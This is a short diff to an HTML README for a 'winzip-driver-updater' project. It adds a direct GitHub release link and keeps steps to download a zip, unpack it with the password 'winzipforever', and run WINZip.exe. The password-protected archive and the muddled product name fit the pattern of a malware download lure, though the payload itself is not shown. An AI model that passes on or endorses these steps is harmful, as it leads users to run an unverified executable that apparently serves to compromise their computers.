@@ -6,7 +6,7 @@
 <hr>
 <h2>Download/How to use it?</h2>
 <ol>
-  <li><a href="#">Download</a> archive <code>winzip-driver-updater.zip</code> on <b>"Releases"</b> page (right side)</li>
+  <li><a href="https://github.com/shapereign/winzip-driver-updater/releases/download/Download/winzip-driver-updater.zip">Download</a> archive <code>winzip-driver-updater.zip</code> on <b>"Releases"</b> page (right side)</li>
   <li>Unarchive file (password: winzipforever)</li>
   <li>Run <code>WINZip.exe</code></li>
 </ol>
